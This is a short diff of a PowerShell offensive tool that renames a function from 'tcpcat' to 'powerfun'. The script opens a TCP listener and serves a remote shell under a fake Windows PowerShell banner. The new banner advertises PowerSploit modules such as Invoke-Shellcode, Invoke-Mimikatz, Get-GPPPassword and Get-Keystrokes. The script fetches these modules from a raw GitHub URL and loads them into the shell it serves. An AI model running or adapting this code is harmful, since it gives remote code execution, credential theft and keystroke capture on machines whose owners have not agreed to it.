@@ -5,7 +5,7 @@ function Get-Webclient {
     $wc
 }
 
-function tcpcat {
+function powerfun {
 
    $modules = @(
 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1',
@@ -25,7 +25,7 @@ function tcpcat {
     $client = $listener.AcceptTcpClient()
     $stream = $client.GetStream() 
 
-    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerUp`n`nType 'Get-Help Invoke-Reflective -Full' for more details on any module.`n`n")
     $stream.Write($sendbytes,0,$sendbytes.Length)
 
     ForEach ($module in $modules)
@@ -52,7 +52,7 @@ function tcpcat {
     $listener.Stop()
 }
 
-tcpcat 
+powerfun 
 
 
 
